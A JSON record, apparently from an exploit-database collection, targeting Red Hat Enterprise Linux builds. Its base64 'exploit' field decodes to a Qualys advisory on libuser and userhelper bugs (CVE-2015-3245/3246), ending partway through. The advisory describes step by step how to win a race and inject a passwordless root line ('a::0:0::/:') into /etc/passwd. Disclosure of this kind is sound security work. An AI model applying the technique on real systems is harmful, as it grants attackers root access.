{
    "cpes": {
        "cpe:/o:redhat:enterprise_linux:6workstation:ga:workstation": {
            "scores": {
                "stride": "000009"
            }
        }, 
        "cpe:/o:redhat:enterprise_linux:7.0:ga:server": {
            "selinux": "enforcing", 
            "packages": [
                "gcc"
            ], 
            "scores": {
                "stride": "000009"
            }
        }, 
        "cpe:/o:redhat:enterprise_linux:7.1:ga:server": {
            "selinux": "enforcing", 
            "packages": [
                "gcc"
            ], 
            "filename": "exploit.c", 
            "scores": {
                "stride": "000009"
            }
        }
    }, 
    "source": "exploit-database", 
    "exploit": "UXVhbHlzIFNlY3VyaXR5IEFkdmlzb3J5DQoNCkNWRS0yMDE1LTMyNDUgdXNlcmhlbHBlciBjaGZuKCkgbmV3bGluZSBmaWx0ZXJpbmcNCg0KQ1ZFLTIwMTUtMzI0NiBsaWJ1c2VyIHBhc3N3ZCBmaWxlIGhhbmRsaW5nDQoNCg0KLS1bIFN1bW1hcnkgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNClRoZSBsaWJ1c2VyIGxpYnJhcnkgaW1wbGVtZW50cyBhIHN0YW5kYXJkaXplZCBpbnRlcmZhY2UgZm9yIG1hbmlwdWxhdGluZw0KYW5kIGFkbWluaXN0ZXJpbmcgdXNlciBhbmQgZ3JvdXAgYWNjb3VudHMsIGFuZCBpcyBpbnN0YWxsZWQgYnkgZGVmYXVsdA0Kb24gTGludXggZGlzdHJpYnV0aW9ucyBkZXJpdmVkIGZyb20gUmVkIEhhdCdzIGNvZGViYXNlLiBEdXJpbmcgYW4NCmludGVybmFsIGNvZGUgYXVkaXQgYXQgUXVhbHlzLCB3ZSBkaXNjb3ZlcmVkIG11bHRpcGxlIGxpYnVzZXItcmVsYXRlZA0KdnVsbmVyYWJpbGl0aWVzIHRoYXQgYWxsb3cgbG9jYWwgdXNlcnMgdG8gcGVyZm9ybSBkZW5pYWwtb2Ytc2VydmljZSBhbmQNCnByaXZpbGVnZS1lc2NhbGF0aW9uIGF0dGFja3MuIEFzIGEgcHJvb2Ygb2YgY29uY2VwdCwgd2UgZGV2ZWxvcGVkIGFuDQp1bnVzdWFsIGxvY2FsIHJvb3QgZXhwbG9pdCBhZ2FpbnN0IG9uZSBvZiBsaWJ1c2VyJ3MgYXBwbGljYXRpb25zLg0KDQoNCi0tLS1bIFZ1bG5lcmFiaWxpdHkgIzEgKENWRS0yMDE1LTMyNDUgdXNlcmhlbHBlciBjaGZuKCkgbmV3bGluZSBmaWx0ZXJpbmcpDQoNCldlIGRpc2NvdmVyZWQgYSBidWcgaW4gdXNlcmhlbHBlciwgYSBzZXR1aWQtcm9vdCBwcm9ncmFtIGZyb20gdGhlDQp1c2VybW9kZSBwYWNrYWdlIHRoYXQgcHJvdmlkZXMgYSBiYXNpYyBpbnRlcmZhY2UgdG8gY2hhbmdlIGEgdXNlcidzDQpwYXNzd29yZCwgZ2Vjb3MgaW5mb3JtYXRpb24sIGFuZCBzaGVsbDsgaXRzIC1mIChGdWxsIE5hbWUpLCAtbyAoT2ZmaWNlKSwNCi1wIChPZmZpY2UgUGhvbmUpIGFuZCAtaCAoSG9tZSBQaG9uZSkgY29tbWFuZC1saW5lIG9wdGlvbnMgYXJlDQplcXVpdmFsZW50IHRvIHRob3NlIG9mIHRoZSB0cmFkaXRpb25hbCBjaGZuIHByb2dyYW0uDQoNCnVzZXJoZWxwZXIncyBjaGZuKCkgZnVuY3Rpb24gdmVyaWZpZXMgdGhhdCB0aGUgZmllbGRzIGl0IHdhcyBnaXZlbiBvbg0KdGhlIGNvbW1hbmQtbGluZSBhcmUgc2FuZSAoaS5lLiwgY29udGFpbiBubyBmb3JiaWRkZW4gY2hhcmFjdGVycykuDQpVbmZvcnR1bmF0ZWx5LCB0aGVzZSBmb3JiaWRkZW4gY2hhcmFjdGVycyAoIjosPSIpIGRvIG5vdCBpbmNsdWRlICdcbicNCmFuZCBhbGxvdyBsb2NhbCBhdHRhY2tlcnMgdG8gaW5qZWN0IG5ld2xpbmUgY2hhcmFjdGVycyBpbnRvIC9ldGMvcGFzc3dkDQphbmQgYWx0ZXIgdGhpcyBmaWxlIGluIHVuZXhwZWN0ZWQgd2F5cy4NCg0KVG8gdGhlIGJlc3Qgb2Ygb3VyIGtub3dsZWRnZSwgdGhpcyBidWcgaXMgYSBsb2NhbCBkZW5pYWwtb2Ytc2VydmljZQ0Kb25seTogd2Ugd2VyZSBub3QgYWJsZSB0byB0dXJuIGl0IGludG8gYSBsb2NhbCByb290IGV4cGxvaXQsIGJ1dCBtYXliZQ0Kc29tZSBjcmVhdGl2ZSBtaW5kcyB3aWxsLg0KDQpUaGVyZSBpcyBhbm90aGVyLCBzZWNvbmRhcnkgYXNwZWN0IG9mIHRoaXMgYnVnOiB1c2VyaGVscGVyIGRlcGVuZHMgb24NCmxpYnVzZXIgdG8gbW9kaWZ5IC9ldGMvcGFzc3dkLCBhbmQgbGlidXNlcidzIGZvcm1hdF9nZW5lcmljKCkgYW5kDQpnZW5lcmljX3NldHBhc3MoKSBmdW5jdGlvbnMgcmVqZWN0IGZpZWxkcyBjb250YWluaW5nIGEgJzonIHRoYXQgd291bGQgYmUNCmludGVycHJldGVkIGFzIGEgZmllbGQgc2VwYXJhdG9yLiBWdWxuZXJhYmlsaXR5ICMxIGNvdWxkIGhhdmUgYmVlbg0KcHJldmVudGVkIGlmIGxpYnVzZXIgaGFkIGFsc28gcmVqZWN0ZWQgJ1xuJyBjaGFyYWN0ZXJzLg0KDQoNCi0tLS1bIFZ1bG5lcmFiaWxpdHkgIzIgKENWRS0yMDE1LTMyNDYgbGlidXNlciBwYXNzd2QgZmlsZSBoYW5kbGluZykNCg0KV2UgZGlzY292ZXJlZCBhIGJ1ZyBpbiBsaWJ1c2VyIGl0c2VsZjogZXZlbiB0aG91Z2ggdHJhZGl0aW9uYWwgcHJvZ3JhbXMNCmxpa2UgcGFzc3dkLCBjaGZuLCBhbmQgY2hzaCB3b3JrIG9uIGEgdGVtcG9yYXJ5IGNvcHkgb2YgL2V0Yy9wYXNzd2QgYW5kDQpldmVudHVhbGx5IHJlbmFtZSgpIGl0LCBsaWJ1c2VyIG1vZGlmaWVzIC9ldGMvcGFzc3dkIGRpcmVjdGx5Lg0KVW5mb3J0dW5hdGVseSwgaWYgYW55dGhpbmcgZ29lcyB3cm9uZyBkdXJpbmcgdGhlc2UgbW9kaWZpY2F0aW9ucywNCmxpYnVzZXIgbWF5IGxlYXZlIC9ldGMvcGFzc3dkIGluIGFuIGluY29uc2lzdGVudCBzdGF0ZS4NCg0KVGhpcyBidWcgaXMgbm90IGp1c3QgYW5vdGhlciBsb2NhbCBkZW5pYWwtb2Ytc2VydmljZTogd2Ugd2VyZSBhYmxlIHRvDQp0dXJuIGl0IGludG8gYSBsb2NhbCByb290IGV4cGxvaXQgYWdhaW5zdCB1c2VyaGVscGVyIGFuZCBjaGZuIChpZiBsaW5rZWQNCndpdGggbGlidXNlcikuDQoNClRoZXJlIGlzIGFsc28gYW5vdGhlciwgc2Vjb25kYXJ5IGFzcGVjdCBvZiB0aGlzIGJ1ZzogZ2xpYmMgbW9kdWxlcyBsaWtlDQpuc3MgYW5kIG5zY2QgZG8gbm90IGV4cGVjdCAvZXRjL3Bhc3N3ZCB0byBiZSBkaXJlY3RseSBtb2RpZmllZCB3aGlsZQ0KdGhleSBwYXJzZSBpdHMgY29udGVudHMsIGFuZCBwcm9ncmFtcyBmcm9tIHBhY2thZ2VzIGxpa2Ugc2hhZG93LXV0aWxzDQphbmQgdXRpbC1saW51eCB1c2UgbGNrcHdkZigpIGxvY2tzIHRoYXQgYXJlIGluY29tcGF0aWJsZSB3aXRoIGxpYnVzZXIncw0KZmNudGwoKSBsb2Nrcy4NCg0KDQotLVsgRXhwbG9pdGF0aW9uIE92ZXJ2aWV3IF0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KSW4gdGhpcyBzZWN0aW9uLCB3ZSBvdXRsaW5lIG91ciB1c2VyaGVscGVyIGV4cGxvaXQgYWdhaW5zdCBsaWJ1c2VyJ3MNClZ1bG5lcmFiaWxpdHkgIzI7IGxhdGVyIGluIHRoaXMgYWR2aXNvcnksIHdlIGV4cGxhaW4gaG93IGl0IGNhbiBiZQ0KZWFzaWx5IGFkYXB0ZWQgdG8gY2hmbiAoaWYgbGlua2VkIHdpdGggbGlidXNlcikuDQoNCk91ciB1bHRpbWF0ZSBnb2FsIGlzIHRvIGluamVjdCBhbiBhcmJpdHJhcnkgbGluZSBpbnRvIC9ldGMvcGFzc3dkIChmb3INCmV4YW1wbGUsIHRoZSBhLWxpbmUgIlxuYTo6MDowOjovOlxuIikgYnV0IHdlIGZpcnN0IG5lZWQgdG8gdW5kZXJzdGFuZA0KaG93IGxpYnVzZXIncyBnZW5lcmljX21vZCgpIGZ1bmN0aW9uIG1vZGlmaWVzIG91ciBvd24gdXNlcidzIGxpbmUgaW4NCi9ldGMvcGFzc3dkOg0KDQotIG9wZW4oKSAvZXRjL3Bhc3N3ZCBmb3IgcmVhZGluZyBhbmQgd3JpdGluZyAoT19SRFdSLCBidXQgbm90IE9fQVBQRU5EDQogIG5vciBPX1RSVU5DKTsNCg0KLSBhY3F1aXJlIHRoZSBmaWxlJ3MgZmNudGwoKSB3cml0ZS1sb2NrIChhbiBleGNsdXNpdmUsIGJ1dCBhZHZpc29yeQ0KICBsb2NrKTsNCg0KLSByZWFkKCkgdGhlIGZpbGUncyBjb250ZW50cyAoaW50byBhIGdfbWFsbG9jKClhdGVkIGJ1ZmZlcik7DQoNCi0gbHNlZWsoKSB0aGUgZmlsZSB0byB0aGUgYmVnaW5uaW5nIG9mIG91ciB1c2VyJ3MgbGluZSAoYW5kIHNraXAgdGhlDQogIHVubW9kaWZpZWQgbGluZXMgdGhhdCBwcmVjZWRlKTsNCg0KLSB3cml0ZSgpIG91ciB1c2VyJ3MgbmV3LCBtb2RpZmllZCBsaW5lIChhbmQgdGhlIHJlc3Qgb2YgdGhlIHVubW9kaWZpZWQNCiAgbGluZXMgdGhhdCBmb2xsb3cpIHRvIHRoZSBmaWxlOw0KDQotIGZ0cnVuY2F0ZSgpIHRoZSBmaWxlIChpZiBvdXIgdXNlcidzIG5ldywgbW9kaWZpZWQgbGluZSBpcyBzaG9ydGVyIHRoYW4NCiAgdGhlIG9sZCBvbmUpOw0KDQotIHJlbGVhc2UgdGhlIGZpbGUncyBmY250bCgpIHdyaXRlLWxvY2s7DQoNCi0gY2xvc2UoKSB0aGUgZmlsZS4NCg0KU3VycHJpc2luZ2x5LCB3ZSBvbmx5IG5lZWQgdHdvIHRoaW5ncyBpbiBvdXIgdG9vbGJveCBpbiBvcmRlciB0byBleHBsb2l0DQp0aGlzIGZ1bmN0aW9uIGFuZCBpbmplY3QgdGhlIGEtbGluZSBpbnRvIC9ldGMvcGFzc3dkOg0KDQotIGEgcGVuY2lsIGFuZCBlcmFzZXIgdGhhdCBhbGxvd3MgdXMgdG8gcmVwZWF0ZWRseSB3cml0ZSgpIGFuZA0KICByZS13cml0ZSgpIG91ciBvd24gR0VDT1MgZmllbGQgKGl0cyBsZW5ndGggYW5kIGxhc3QgY2hhcmFjdGVyIGluDQogIHBhcnRpY3VsYXIpIGluIC9ldGMvcGFzc3dkOiB0aGUgdXNlcmhlbHBlciBwcm9ncmFtIGl0c2VsZjsNCg0KLSBhIHBhaXIgb2Ygc2Npc3NvcnMgdGhhdCBhbGxvd3MgdXMgdG8gaW50ZXJydXB0IHdyaXRlKCkgd2l0aCBieXRlDQogIHByZWNpc2lvbiBhbmQgYXZvaWQgZnRydW5jYXRlKCk6IHRoZSByZXNvdXJjZSBsaW1pdCBSTElNSVRfRlNJWkUsICJUaGUNCiAgbWF4aW11bSBzaXplIG9mIGZpbGVzIHRoYXQgdGhlIHByb2Nlc3MgbWF5IGNyZWF0ZS4gQXR0ZW1wdHMgdG8gZXh0ZW5kDQogIGEgZmlsZSBiZXlvbmQgdGhpcyBsaW1pdCByZXN1bHQgaW4gZGVsaXZlcnkgb2YgYSBTSUdYRlNaIHNpZ25hbC4gQnkNCiAgZGVmYXVsdCwgdGhpcyBzaWduYWwgdGVybWluYXRlcyBhIHByb2Nlc3MsIGJ1dCBhIHByb2Nlc3MgY2FuIGNhdGNoDQogIHRoaXMgc2lnbmFsIGluc3RlYWQsIGluIHdoaWNoIGNhc2UgdGhlIHJlbGV2YW50IHN5c3RlbSBjYWxsIChlLmcuLA0KICB3cml0ZSgyKSwgdHJ1bmNhdGUoMikpIGZhaWxzIHdpdGggdGhlIGVycm9yIEVGQklHLiINCg0KRm9yIGVhY2ggY2hhcmFjdGVyIGluIHRoZSBhLWxpbmUgKGJlZ2lubmluZyB3aXRoIGl0cyBsYXN0IGNoYXJhY3RlciBhbmQNCmVuZGluZyB3aXRoIGl0cyBmaXJzdCBjaGFyYWN0ZXIpLCB3ZSBmb3JrKCkgYSBuZXcgcHJvY2VzcyBhbmQgZXhlY3ZlKCkNCnVzZXJoZWxwZXIgd2l0aDoNCg0KLSBhIEdFQ09TIGZpZWxkIHRoYXQgYWxsb3dzIHVzIHRvIHdyaXRlKCkgdGhlIGNoYXJhY3RlciB0byBpdHMgdGFyZ2V0DQogIG9mZnNldCBpbiAvZXRjL3Bhc3N3ZDsNCg0KLSBhbiBSTElNSVRfRlNJWkUgdGhhdCBhbGxvd3MgdXMgdG8gdGVybWluYXRlIHRoZSBwcm9jZXNzIGJlZm9yZSBpdA0KICB3cml0ZSgpcyBvciBmdHJ1bmNhdGUoKXMgdGhlIGNoYXJhY3RlcnMgdGhhdCBmb2xsb3cuDQoNCkluIHRoaXMgZXhhbXBsZSwgdGhlIG5ld2xpbmUgY2hhcmFjdGVyICdcbicgaXMgcmVwcmVzZW50ZWQgYnkgfCwgYW5kIHRoZQ0KbGFzdCBjaGFyYWN0ZXIgd3JpdHRlbiAoYmVmb3JlIHdyaXRlKCkgaXMgaW50ZXJydXB0ZWQgYnkgUkxJTUlUX0ZTSVpFKQ0KaXMgbWFya2VkIHdpdGggXjoNCg0KLi4ufC4uLnx1c2VyOng6MTAwMDoxMDAwOjovaG9tZS91c2VyOi9iaW4vYmFzaHwuLi58Li4ufA0KLi4ufC4uLnx1c2VyOng6MTAwMDoxMDAwOkFBQUFBQUFBQUFBQUFBQUFBQUE6L2hvbWUvdXNlcjovYmluL2Jhc2h8Li4ufC4uLnwNCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBOi9ob21lL3VzZXI6fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXg0KLi4ufC4uLnx1c2VyOng6MTAwMDoxMDAwOkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBOi9ob21lLzp8Li4ufC4uLnwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBOi86fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE6Oi86fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXg0KLi4ufC4uLnx1c2VyOng6MTAwMDoxMDAwOkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBMDo6Lzp8Li4ufC4uLnwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBOjA6Oi86fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEwOjA6Oi86fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXg0KLi4ufC4uLnx1c2VyOng6MTAwMDoxMDAwOkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBOjA6MDo6Lzp8Li4ufC4uLnwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBOjowOjA6Oi86fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFhOjowOjA6Oi86fC4uLnwuLi58DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXg0KLi4ufC4uLnx1c2VyOng6MTAwMDoxMDAwOkFBQUFBQUFBOi9ob21lL3VzZXI6L2Jpbi9iYXNofGE6OjA6MDo6Lzp8Li4ufC4uLnwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NCi4uLnwuLi58dXNlcjp4OjEwMDA6MTAwMDo6L2hvbWUvdXNlcjovYmluL2Jhc2h8YTo6MDowOjovOnwuLi58Li4ufA0KDQoNCi0tWyBFeHBsb2l0YXRpb24gRGV0YWlscyBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpJbiB0aGlzIHNlY3Rpb24sIHdlIGRpc2N1c3MgdGhlIHByb2JsZW1zIHdlIGVuY291bnRlcmVkIHdoaWxlIGRldmVsb3BpbmcNCm91ciB1c2VyaGVscGVyIGV4cGxvaXQsIGFuZCBob3cgd2Ugc29sdmVkIHRoZW0uDQoNCg0KLS0tLVsgUHJvYmxlbSAjMSAobWlzc2luZyBmaWVsZHMpDQoNCkF0IHRoZSBlbmQgb2Ygb3VyICJFeHBsb2l0YXRpb24gT3ZlcnZpZXciIGV4YW1wbGUsIG91ciBob21lLWRpcmVjdG9yeQ0KYW5kIHNoZWxsLXByb2dyYW0gZmllbGRzIHNlZW0gdG8gbWFnaWNhbGx5IHJlYXBwZWFyIGluIC9ldGMvcGFzc3dkLA0KYWx0aG91Z2ggdGhleSB3ZXJlIHByZXZpb3VzbHkgY3V0IG91dCBieSBSTElNSVRfRlNJWkUuDQoNClRoaXMgbWFnaWMgdHJpY2sgaW50cm9kdWNlcyBQcm9ibGVtICMxOiB3ZSBjYW5ub3Qgc2ltcGx5IGZvcmsoKSBhIG5ldw0KcHJvY2VzcyBmb3IgZWFjaCBjaGFyYWN0ZXIgaW4gdGhlIGEtbGluZSwgZXhlY3ZlKCkgdXNlcmhlbHBlciwgYW5kIGxldA0KaXQgcnVuIHVudGlsIHRoZSBjaGFyYWN0ZXIgaXMgd3JpdHRlbiB0byBpdHMgdGFyZ2V0IG9mZnNldCBpbg0KL2V0Yy9wYXNzd2QsIGJlY2F1c2UgbGlidXNlciByZWZ1c2VzIHRvIG1vZGlmeSBvdXIgdXNlcidzIGxpbmUgaWYgc29tZQ0Kb2YgaXRzIGZpZWxkcyBhcmUgbWlzc2luZy4NCg0KSW4gb3JkZXIgdG8gc29sdmUgdGhpcyBQcm9ibGVtICMxLCB3ZSBmb3JrKCkgYSBuZXcgcHJvY2VzcyBmb3IgZWFjaA0KY2hhcmFjdGVyIGluIHRoZSBhLWxpbmUsIGV4ZWN2ZSgpIHVzZXJoZWxwZXIsIGFuZCBsZXQgaXQgbG9hZCBvdXIgdXNlcidzDQpvcmlnaW5hbCwgdW5jdXQgbGluZSBmcm9tIC9ldGMvcGFzc3dkLCBidXQgd2UgU0lHU1RPUCB0aGUgcHJvY2VzcyBiZWZvcmUNCml0IG9wZW4oKXMgL2V0Yy9wYXNzd2QgZm9yIHdyaXRpbmcuIE9ubHkgYWZ0ZXIgd2UgaGF2ZSBzdGFydGVkIGFuZA0Kc3RvcHBlZCBhbGwgdXNlcmhlbHBlciBwcm9jZXNzZXMgY2FuIHdlIHNhZmVseSBTSUdDT05UIHRoZW0sIG9uZSBhdCBhDQp0aW1lLg0KDQoNCi0tLS1bIFByb2JsZW0gIzIgKGJhY2t1cCBmaWxlKQ0KDQpCZWZvcmUgbGlidXNlciBvcGVuKClzIC9ldGMvcGFzc3dkIGZvciB3cml0aW5nLCBpdCBjcmVhdGVzIGEgYmFja3VwIGZpbGUNCm5hbWVkIC9ldGMvcGFzc3dkLSBhbmQgaWYgdGhpcyBiYWNrdXAgZmFpbHMsIGxpYnVzZXIgcmVmdXNlcyB0byBtb2RpZnkNCi9ldGMvcGFzc3dkLiBVbmZvcnR1bmF0ZWx5LCBvdXIgUkxJTUlUX0ZTSVpFIGFsc28gYXBwbGllcyB0byB0aGUgYmFja3VwLA0Kd2hpY2ggd2lsbCBmYWlsIGlmIHRoZSBSTElNSVRfRlNJWkUgaXMgbGVzcyB0aGFuIHRoZSBzaXplIG9mDQovZXRjL3Bhc3N3ZC4NCg0KVGhpcyBpbnRyb2R1Y2VzIFByb2JsZW0gIzI6IGluIGFwcGFyZW50IGNvbnRyYWRpY3Rpb24gdG8gd2hhdCB3ZSBqdXN0DQpzYWlkLCBvdXIgZXhwbG9pdCBuZWVkcyB0byBkZWNyZWFzZSBSTElNSVRfRlNJWkUgYWZ0ZXIgZWFjaCBjaGFyYWN0ZXIgaXQNCmluamVjdHMgaW50byAvZXRjL3Bhc3N3ZCAoYXMgc2hvd24gaW4gdGhlICJFeHBsb2l0YXRpb24gT3ZlcnZpZXciDQpleGFtcGxlKS4NCg0KSW4gb3JkZXIgdG8gc29sdmUgdGhpcyBQcm9ibGVtICMyLCB3ZSByZWZpbmUgUHJvYmxlbSAjMSdzDQpTSUdTVE9QL1NJR0NPTlQgc29sdXRpb246IHdlIGxldCBlYWNoIHVzZXJoZWxwZXIgcHJvY2VzcyBsb2FkIG91ciB1c2VyJ3MNCm9yaWdpbmFsLCB1bmN1dCBsaW5lIGZyb20gL2V0Yy9wYXNzd2QsIGFuZCBTSUdTVE9QIHRoZSBwcm9jZXNzIGFmdGVyIGl0DQpjcmVhdGVzIHRoZSBiYWNrdXAgZmlsZSBidXQgYmVmb3JlIGl0IG1vZGlmaWVzIC9ldGMvcGFzc3dkLiBJbiBvdGhlcg0Kd29yZHMsIHdlIGhhdmUgdG8gd2luIGEgcmFjZSBhZ2FpbnN0IGdlbmVyaWNfbW9kKCkncyBzeXN0ZW0gY2FsbHMsIHdoaWNoDQpjcmVhdGUgdGhlIGJhY2t1cCBmaWxlIGFuZCBtb2RpZnkgL2V0Yy9wYXNzd2Q6DQoNCi0gb3BlbigpIHRoZSBwYXNzd2QgZmlsZSAvZXRjL3Bhc3N3ZCBmb3IgcmVhZGluZzsNCi0gYWNxdWlyZSB0aGUgcGFzc3dkIGZpbGUncyBmY250bCgpIHJlYWQtbG9jazsNCg0KLSBvcGVuKCkgdGhlIGJhY2t1cCBmaWxlIC9ldGMvcGFzc3dkLSBmb3Igd3JpdGluZzsNCi0gYWNxdWlyZSB0aGUgYmFja3VwIGZpbGUncyBmY250bCgpIHdyaXRlLWxvY2s7DQoNCi0gcmVhZCgpIGZyb20gdGhlIHBhc3N3ZCBmaWxlOw0KLSB3cml0ZSgpIHRvIHRoZSBiYWNrdXAgZmlsZTsNCi0gZnRydW5jYXRlKCkgdGhlIGJhY2t1cCBmaWxlOw0KDQotIHJlbGVhc2UgdGhlIGJhY2t1cCBmaWxlJ3MgZmNudGwoKSB3cml0ZS1sb2NrOw0KLSBjbG9zZSgpIHRoZSBiYWNrdXAgZmlsZTsNCg0KLSByZWxlYXNlIHRoZSBwYXNzd2QgZmlsZSdzIGZjbnRsKCkgcmVhZC1sb2NrOw0KLSBjbG9zZSgpIHRoZSBwYXNzd2QgZmlsZTsNCg0KLSBvcGVuKCkgL2V0Yy9wYXNzd2QgZm9yIHJlYWRpbmcgYW5kIHdyaXRpbmc7DQpbUkFDRSBXSU5ET1cgQkVHSU5TXQ0KLSBhY3F1aXJlIHRoZSBmaWxlJ3MgZmNudGwoKSB3cml0ZS1sb2NrOiBmYWlsdXJlLCBzbGVlcCBmb3IgYSBmZXcgbWljcm9zZWNvbmRzOw0KLSBhY3F1aXJlIHRoZSBmaWxlJ3MgZmNudGwoKSB3cml0ZS1sb2NrOiBmYWlsdXJlLCBzbGVlcCBmb3IgYSBmZXcgbWljcm9zZWNvbmRzOw0KLSBhY3F1aXJlIHRoZSBmaWxlJ3MgZmNudGwoKSB3cml0ZS1sb2NrOiBmYWlsdXJlLCBzbGVlcCBmb3IgYSBmZXcgbWljcm9zZWNvbmRzOw0KW1JBQ0UgV0lORE9XIEVORFNdDQotIGFjcXVpcmUgdGhlIGZpbGUncyBmY250bCgpIHdyaXRlLWxvY2s6IHN1Y2Nlc3M7DQotIHJlYWQoKSB0aGUgZmlsZSdzIGNvbnRlbnRzOw0KLSBldGMuDQoNCkluIG9yZGVyIHRvIHJlbGlhYmx5IHdpbiB0aGlzIHJhY2UgYWdhaW5zdCBhbGwgdXNlcmhlbHBlciBwcm9jZXNzZXMgKG9uZQ0KZm9yIGVhY2ggY2hhcmFjdGVyIGluIHRoZSBhLWxpbmUpLCB3ZToNCg0KLSB3aWRlbiB0aGUgcmFjZSB3aW5kb3cuIFdlIGFjcXVpcmUgYSByZWFkLWxvY2sgb24gL2V0Yy9wYXNzd2QgYmVmb3JlIHdlDQogIGV4ZWN2ZSgpIHVzZXJoZWxwZXIsIHdoaWNoIHByZXZlbnRzIGxpYnVzZXIgZnJvbSBhY3F1aXJpbmcgdGhlDQogIHdyaXRlLWxvY2sgb24gL2V0Yy9wYXNzd2QsIGFuZCBmb3JjZXMgaXQgdG8gc2xlZXAgZm9yIGEgZmV3DQogIG1pY3Jvc2Vjb25kcyAoTFVfTE9DS19USU1FT1VUIGlzIDIsIExVX01BWF9MT0NLX0FUVEVNUFRTIGlzIDYpLg0KDQotIHBpbnBvaW50IHRoZSByYWNlIHdpbmRvdy4gV2UgbW9uaXRvciB0aGUgZmlsZXN5c3RlbSBmb3IgdGhlIGZvbGxvd2luZw0KICBzZXF1ZW5jZSBvZiBpbm90aWZ5IGV2ZW50czoNCg0KICAuIElOX0NSRUFURSBvbiAvZXRjIGlmIHRoZSBiYWNrdXAgZmlsZSBkb2VzIG5vdCBleGlzdDsNCiAgLiBJTl9DTE9TRV9XUklURSBvbiB0aGUgYmFja3VwIGZpbGU7DQogIC4gSU5fQ0xPU0VfTk9XUklURSBvbiB0aGUgcGFzc3dkIGZpbGU7DQogIC4gSU5fT1BFTiBvbiB0aGUgcGFzc3dkIGZpbGUuDQoNCi0gcHJlZW1wdCB0aGUgdXNlcmhlbHBlciBwcm9jZXNzZXMuIFdlIHNldHByaW9yaXR5KCkgdGhlbSB0byB0aGUgbG93ZXN0DQogIHByaW9yaXR5LCBzY2hlZF9zZXRzY2hlZHVsZXIoKSB0aGVtIHRvIFNDSEVEX0lETEUsIGFuZA0KICBzY2hlZF9zZXRhZmZpbml0eSgpIHRoZW0gdG8gdGhlIHNhbWUgQ1BVIGFzIG91ciBleHBsb2l0Lg0KDQoNCi0tLS1bIFByb2JsZW0gIzMgKGxhc3QgdXNlcikNCg0KSWYgb3VyIHVzZXIncyBsaW5lIGlzIHRoZSBsYXN0IG9uZSBpbiAvZXRjL3Bhc3N3ZCwgdGhlbiB0aGUgbGFzdA0KY2hhcmFjdGVyIHdlIGluamVjdCBpbnRvIHRoZSBmaWxlICh0aGUgJ1xuJyB0aGF0IGVuZHMgb3VyIHVzZXIncyBsaW5lDQphbmQgYmVnaW5zIHRoZSBhLWxpbmUpIGlzIGFsc28gdGhlIHZlcnkgbGFzdCBjaGFyYWN0ZXIgb2Ygd3JpdGUoKSdzDQpidWZmZXIsIHdoaWNoIGludHJvZHVjZXMgUHJvYmxlbSAjMzogdGhpcyBsYXN0IHdyaXRlKCkgd2lsbCBub3QgZXhjZWVkDQpvdXIgUkxJTUlUX0ZTSVpFLCBhbmQgdGhlIGNvbnNlcXVlbnQgZnRydW5jYXRlKCkgd2lsbCBkZWxldGUgdGhlIGEtbGluZQ0KZnJvbSB0aGUgZW5kIG9mIC9ldGMvcGFzc3dkLg0KDQpJbiBvcmRlciB0byBzb2x2ZSB0aGlzIFByb2JsZW0gIzM6DQoNCi0gZWl0aGVyIHdlIFNJR0tJTEwgdGhlIGxhc3QgdXNlcmhlbHBlciBwcm9jZXNzIGFmdGVyIHdyaXRlKCkgYnV0IGJlZm9yZQ0KICBmdHJ1bmNhdGUoKS4gV2UgcmVsaWFibHkgd2luIHRoaXMgcmFjZSB3aXRoIGFuIElOX01PRElGWSBldmVu